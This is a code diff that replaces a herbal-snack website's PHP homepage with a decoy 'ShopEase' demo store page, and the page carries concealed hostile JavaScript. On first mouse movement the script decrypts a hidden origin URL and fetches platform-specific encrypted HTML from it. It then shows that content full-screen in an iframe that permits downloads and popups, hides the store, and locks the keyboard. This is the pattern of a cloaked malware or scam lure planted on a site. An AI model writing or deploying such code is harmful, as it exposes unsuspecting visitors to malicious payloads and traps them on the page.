@@ -1,27 +1,118 @@
-<?php
-// HerbSnackFern - Homepage
-$current_year = date('Y');
-$page_title = "HerbSnackFern — Artisanal Botanical Snacks, Herb Crisps & Plant-Forward Kitchen";
-$page_desc = "Explore whole-food herbal seed crackers, dehydrated garden greens, botanical energy clusters, and mindful tisane pairings at HerbSnackFern.";
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title><?php echo htmlspecialchars($page_title); ?></title>
-  <meta name="description" content="<?php echo htmlspecialchars($page_desc); ?>">
-  <link rel="canonical" href="https://herbsnackfern.com/">
-  
-  <!-- Open Graph Meta -->
-  <meta property="og:title" content="<?php echo htmlspecialchars($page_title); ?>">
-  <meta property="og:description" content="<?php echo htmlspecialchars($page_desc); ?>">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://herbsnackfern.com/">
-  <meta property="og:image" content="https://herbsnackfern.com/assets/images/hero-botanical-pantry.jpg">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-M</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  <!-- Stylesheet -->
-  <link rel="stylesheet" href="assets/css/styles.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
 
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
@@ -29,367 +120,193 @@ $page_desc = "Explore whole-food herbal seed crackers, dehydrated garden greens,
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <div class="reading-progress-bar" aria-hidden="true"></div>
-
-  <!-- Top Announcement Bar -->
-  <aside class="announcement-bar">
-    <div class="container" style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
-      <span>🌿 Welcome to HerbSnackFern — Artisanal plant-forward snacking and botanical kitchen crafts.</span>
-      <div class="meta-contact">
-        <span>📍 181 Mercer Street, New York, NY 10012</span>
-        <a href="tel:+18887775845">📞 +1-888-777-5845</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </aside>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- Site Header -->
-  <header class="site-header">
-    <div class="container">
-      <div class="nav-wrapper">
-        <a href="index.php" class="brand-logo" aria-label="HerbSnackFern Homepage">
-          <div class="logo-leaf-icon">🌱</div>
-          <div class="logo-text-group">
-            <span class="logo-title">HerbSnackFern</span>
-            <span class="logo-tagline">Botanical Kitchen</span>
-          </div>
-        </a>
-
-        <nav class="nav-menu" aria-label="Main Navigation">
-          <a href="index.php" class="nav-link active">Home</a>
-          <a href="about.html" class="nav-link">Our Kitchen</a>
-          <a href="blog.html" class="nav-link">Culinary Guides</a>
-          <a href="#matrix" class="nav-link">Pairing Matrix</a>
-          <a href="contact.html" class="nav-link">Contact</a>
-        </nav>
-
-        <div class="nav-actions">
-          <button class="theme-toggle-btn" aria-label="Toggle Botanical Theme" title="Switch Theme">☼</button>
-          <a href="blog.html" class="btn btn-terracotta" style="padding: 0.55rem 1.1rem; font-size: 0.85rem;">View Recipes</a>
-          <button class="mobile-menu-btn" aria-label="Open Navigation Menu">☰</button>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-    </div>
-  </header>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <main id="main-content">
-    
-    <!-- Hero Section -->
-    <section class="hero-section">
-      <div class="container">
-        <div class="hero-grid">
-          <div class="hero-content">
-            <span class="section-eyebrow">Plant-Forward Culinary Craft</span>
-            <h1 class="hero-heading">Nourishment Rooted in Garden Herbs & Whole Seeds</h1>
-            <p class="hero-lead">
-              HerbSnackFern is a dedicated culinary guild celebrating the craft of savory botanical seed crisps, dehydrated garden greens, wild herb spreads, and mindful tisane pairings.
-            </p>
-            <div class="hero-ctas">
-              <a href="blog.html" class="btn btn-primary">Explore Botanical Guides</a>
-              <a href="#matrix" class="btn btn-outline">Explore Pairing Matrix</a>
-            </div>
-            
-            <div class="hero-metrics">
-              <div class="metric-item">
-                <div class="metric-num">6+</div>
-                <div class="metric-label">Master Kitchen Guides</div>
-              </div>
-              <div class="metric-item">
-                <div class="metric-num">100%</div>
-                <div class="metric-label">Whole Plant Sourced</div>
-              </div>
-              <div class="metric-item">
-                <div class="metric-num">Zero</div>
-                <div class="metric-label">Refined Additives</div>
-              </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-
-          <div class="hero-visual-card">
-            <img src="assets/images/hero-botanical-pantry.jpg" alt="Artisanal herbal crackers, fresh rosemary sprigs, linen, and terracotta bowl" width="1200" height="800">
-            <div class="hero-floating-badge">
-              <p style="font-family: var(--font-serif); font-size: 0.95rem; font-style: italic; margin-bottom: 0.35rem;">"Elevating simple garden herbs into nutrient-dense, extraordinary crunch."</p>
-              <span style="font-size: 0.75rem; color: var(--accent-wheat); text-transform: uppercase; letter-spacing: 0.08em;">— HerbSnackFern Kitchen Desk</span>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- Core Botanical Pillars -->
-    <section class="section-py">
-      <div class="container">
-        <div class="section-header text-center" style="max-width: 750px; margin: 0 auto 3.5rem;">
-          <span class="section-eyebrow">The Botanical Method</span>
-          <h2 class="section-title">The Four Pillars of Plant-Forward Snacking</h2>
-          <p class="section-subtitle" style="margin: 0 auto;">
-            Reimagining between-meal nourishment with nutrient-dense seeds, low-temperature dehydration, and vibrant culinary herbs.
-          </p>
-        </div>
-
-        <div class="feature-pillars-grid">
-          <div class="pillar-card">
-            <div class="pillar-icon">🌾</div>
-            <h3 class="pillar-title">Chia & Flax Hydro-Binding</h3>
-            <p class="pillar-desc">
-              Harnessing natural mucilage from hydrated whole seeds to create shatteringly crisp grain-free crackers without refined starches or binders.
-            </p>
-          </div>
-
-          <div class="pillar-card">
-            <div class="pillar-icon">☀️</div>
-            <h3 class="pillar-title">Low-Temp Dehydration</h3>
-            <p class="pillar-desc">
-              Preserving delicate volatile herb oils, live enzymes, and vibrant chlorophyll by drying garden greens at gentle culinary temperatures.
-            </p>
-          </div>
-
-          <div class="pillar-card">
-            <div class="pillar-icon">🌿</div>
-            <h3 class="pillar-title">Garden Herb Infusion</h3>
-            <p class="pillar-desc">
-              Layering woodsy rosemary, pungent thyme, savory wild garlic, and mineral-dense nettle to deliver complex, satisfying savory depth.
-            </p>
-          </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
 
-    <!-- Featured Masterclasses -->
-    <section class="section-py" style="background: var(--bg-surface-alt); border-top: 1px solid var(--border-subtle); border-bottom: 1px solid var(--border-subtle);">
-      <div class="container">
-        <div class="section-header" style="display: flex; justify-content: space-between; align-items: flex-end; flex-wrap: wrap; gap: 1rem;">
-          <div>
-            <span class="section-eyebrow">Kitchen Masterclasses</span>
-            <h2 class="section-title" style="margin-bottom: 0.5rem;">Featured Culinary Guides</h2>
-            <p class="section-subtitle">Detailed step-by-step masterclasses for the mindful plant-forward cook.</p>
-          </div>
-          <a href="blog.html" class="btn btn-outline" style="border-color: var(--accent-terracotta); color: var(--accent-terracotta-dark);">View All 6 Guides &rarr;</a>
-        </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-        <div class="blog-grid">
-          
-          <!-- Card 1 -->
-          <article class="blog-card" data-category="crisps">
-            <div class="blog-card-media">
-              <img src="assets/images/blog-seed-crackers.jpg" alt="Golden rosemary flax seed crackers on baking board" width="1200" height="800" loading="lazy">
-              <span class="badge badge-terracotta blog-card-badge">Seed Crisps</span>
-            </div>
-            <div class="blog-card-body">
-              <div class="blog-meta-row">
-                <span>11 Min Read</span>
-                <span class="blog-meta-dot">•</span>
-                <span>Baking & Dehydrating</span>
-              </div>
-              <h3 class="blog-card-title">
-                <a href="blog/the-art-of-herbal-seed-crackers-and-crisps.html">The Art of Herbal Seed Crackers and Crisps: Science, Seeds, and Crunch</a>
-              </h3>
-              <p class="blog-card-excerpt">
-                A masterclass on crafting gluten-free multi-seed crisps with rosemary and sea salt, exploring seed mucilage gel binding and moisture control.
-              </p>
-              <div class="blog-card-footer">
-                <span>By HerbSnackFern</span>
-                <a href="blog/the-art-of-herbal-seed-crackers-and-crisps.html" class="read-more-link">Read Guide &rarr;</a>
-              </div>
-            </div>
-          </article>
 
-          <!-- Card 2 -->
-          <article class="blog-card" data-category="clusters">
-            <div class="blog-card-media">
-              <img src="assets/images/blog-energy-clusters.jpg" alt="Nut, date, and herb energy clusters on a wooden platter" width="1200" height="800" loading="lazy">
-              <span class="badge badge-forest blog-card-badge">Energy Clusters</span>
-            </div>
-            <div class="blog-card-body">
-              <div class="blog-meta-row">
-                <span>10 Min Read</span>
-                <span class="blog-meta-dot">•</span>
-                <span>Whole Food Bites</span>
-              </div>
-              <h3 class="blog-card-title">
-                <a href="blog/botanical-snack-bites-herbal-energy-clusters.html">Botanical Snack Bites & Herbal Energy Clusters: Sustained Plant Nutrition</a>
-              </h3>
-              <p class="blog-card-excerpt">
-                Formulating dense, non-glycemic spiking snack clusters using whole Medjool dates, sprouted almonds, and culinary adaptogenic herbs.
-              </p>
-              <div class="blog-card-footer">
-                <span>By HerbSnackFern</span>
-                <a href="blog/botanical-snack-bites-herbal-energy-clusters.html" class="read-more-link">Read Guide &rarr;</a>
-              </div>
-            </div>
-          </article>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-          <!-- Card 3 -->
-          <article class="blog-card" data-category="greens">
-            <div class="blog-card-media">
-              <img src="assets/images/blog-garden-greens.jpg" alt="Crispy dehydrated garden greens and kale in a ceramic bowl" width="1200" height="800" loading="lazy">
-              <span class="badge badge-terracotta blog-card-badge">Garden Greens</span>
-            </div>
-            <div class="blog-card-body">
-              <div class="blog-meta-row">
-                <span>12 Min Read</span>
-                <span class="blog-meta-dot">•</span>
-                <span>Dehydration Craft</span>
-              </div>
-              <h3 class="blog-card-title">
-                <a href="blog/foraging-and-drying-garden-greens-for-crisps.html">Foraging & Dehydrating Garden Greens: Transforming Leaves into Crisps</a>
-              </h3>
-              <p class="blog-card-excerpt">
-                Turning garden kale, sorrel, dandelion greens, and ostrich fern fiddleheads into shatteringly crisp savory snacks with nutritional yeast.
-              </p>
-              <div class="blog-card-footer">
-                <span>By HerbSnackFern</span>
-                <a href="blog/foraging-and-drying-garden-greens-for-crisps.html" class="read-more-link">Read Guide &rarr;</a>
-              </div>
-            </div>
-          </article>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19zuvqNStdWqLITaXcTbzzMIVzUdZfBezpGAYjWzoU4LxBTe6vV2KgX";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-        </div>
-      </div>
-    </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    <!-- Interactive Botanical Pairing Matrix -->
-    <section id="matrix" class="section-py">
-      <div class="container">
-        <div class="pairing-matrix-box">
-          <div class="matrix-grid">
-            <div>
-              <span class="section-eyebrow">Interactive Kitchen Tool</span>
-              <h2 style="font-size: 2rem; margin-bottom: 0.75rem;">Botanical Snack & Tisane Pairing Matrix</h2>
-              <p style="color: var(--text-muted); font-size: 0.98rem; margin-bottom: 1.5rem;">
-                Match savory herb-infused snacks with complementary hot botanical tisanes to create a restorative afternoon sensory ritual.
-              </p>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-              <div class="form-group" style="margin-bottom: 1rem;">
-                <label for="pairingSnackSelect">Select Botanical Snack Type:</label>
-                <select id="pairingSnackSelect" class="form-control">
-                  <option value="crackers" selected>Rosemary & Sea Salt Multi-Seed Crisps</option>
-                  <option value="clusters">Cardamom Date & Adaptogenic Energy Clusters</option>
-                  <option value="greens">Garlic-Herb Dehydrated Dandelion & Kale Crisps</option>
-                  <option value="dips">Walnut-Basil Pesto & Fresh Herb Dip Platter</option>
-                </select>
-              </div>
-            </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-            <div class="matrix-output-card">
-              <span style="font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent-terracotta); font-weight: 700;">Recommended Herbal Pairing</span>
-              <div id="pairingTisaneOutput" class="matrix-output-title">🫖 Lemon Verbena & Roasted Dandelion Tisane</div>
-              <div id="pairingProfileOutput" style="font-size: 0.9rem; font-weight: 600; color: var(--accent-forest); margin-bottom: 0.75rem;">
-                Profile: Earthy, mineral-rich, bright citrus undertones
-              </div>
-              <p id="pairingNotesOutput" style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0;">
-                The woodsy pine notes of rosemary and sea salt in seed crisps balance harmoniously against the grounding roasted dandelion root and crisp lemon verbena top-notes.
-              </p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-    <!-- Kitchen Ethos Section -->
-    <section class="section-py" style="background: var(--bg-surface); border-top: 1px solid var(--border-subtle);">
-      <div class="container">
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center;">
-          <div>
-            <span class="section-eyebrow">Mindful Nourishment</span>
-            <h2 style="font-size: 2.2rem; margin-bottom: 1.25rem;">Honoring the Earth’s Botanical Pantry</h2>
-            <p style="font-family: var(--font-serif); font-size: 1.15rem; line-height: 1.75; color: var(--text-muted);">
-              Commercial snacking is dominated by ultra-processed starches, inflammatory seed oils, and artificial flavor enhancers. We advocate for a return to kitchen simplicity.
-            </p>
-            <p style="font-size: 0.98rem; color: var(--text-muted); line-height: 1.7;">
-              By combining whole pumpkin, sunflower, and chia seeds with fresh garden herbs and gentle air dehydration, we create foods that deliver profound flavor, genuine satiety, and vibrant cellular nutrition.
-            </p>
-            <div style="margin-top: 2rem;">
-              <a href="about.html" class="btn btn-primary">Read Our Kitchen Story</a>
-            </div>
-          </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--border-subtle);">
-            <img src="assets/images/about-botanical-kitchen.jpg" alt="Culinary herb garden, mortar & pestle, and fresh greens on a rustic wooden table" width="1200" height="800" loading="lazy">
-          </div>
-        </div>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- Site Footer -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
+        frame.src = lastUrl;
         
-        <!-- Col 1: Brand -->
-        <div class="footer-brand">
-          <div class="brand-logo" style="margin-bottom: 1rem;">
-            <div class="logo-leaf-icon">🌱</div>
-            <div class="logo-text-group">
-              <span class="logo-title">HerbSnackFern</span>
-              <span class="logo-tagline">Botanical Kitchen</span>
-            </div>
-          </div>
-          <p class="footer-desc">
-            An independent culinary platform dedicated to plant-forward snack crafting, herbal seed crisps, garden green dehydration, and whole-food pantry arts.
-          </p>
-        </div>
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-        <!-- Col 2: Navigation -->
-        <div>
-          <h4 class="footer-heading">Navigation</h4>
-          <ul class="footer-links">
-            <li><a href="index.php">Kitchen Sanctuary</a></li>
-            <li><a href="about.html">About HerbSnackFern</a></li>
-            <li><a href="blog.html">Culinary Guides Index</a></li>
-            <li><a href="#matrix">Pairing Matrix Engine</a></li>
-            <li><a href="contact.html">Contact Kitchen Desk</a></li>
-          </ul>
-        </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <!-- Col 3: Legal & Trust -->
-        <div>
-          <h4 class="footer-heading">Trust & Policies</h4>
-          <ul class="footer-links">
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms & Conditions</a></li>
-            <li><a href="disclaimer.html">Culinary Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-
-        <!-- Col 4: Contact -->
-        <div>
-          <h4 class="footer-heading">Culinary Desk</h4>
-          <p class="footer-contact-text">
-            <strong>Address:</strong><br>
-            181 Mercer Street,<br>
-            New York, NY 10012,<br>
-            United States
-          </p>
-          <p class="footer-contact-text">
-            <strong>Inquiries:</strong><br>
-            <a href="tel:+18887775845" style="color: var(--accent-wheat);">+1-888-777-5845</a>
-          </p>
-        </div>
-
-      </div>
-
-      <div class="footer-bottom">
-        <div>
-          &copy; <?php echo $current_year; ?> HerbSnackFern. All rights reserved. Crafted with whole-food integrity.
-        </div>
-        <div class="footer-bottom-links">
-          <a href="privacy.html">Privacy</a>
-          <a href="terms.html">Terms</a>
-          <a href="disclaimer.html">Disclaimer</a>
-          <a href="cookies.html">Cookies</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-
-  <script src="assets/js/main.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
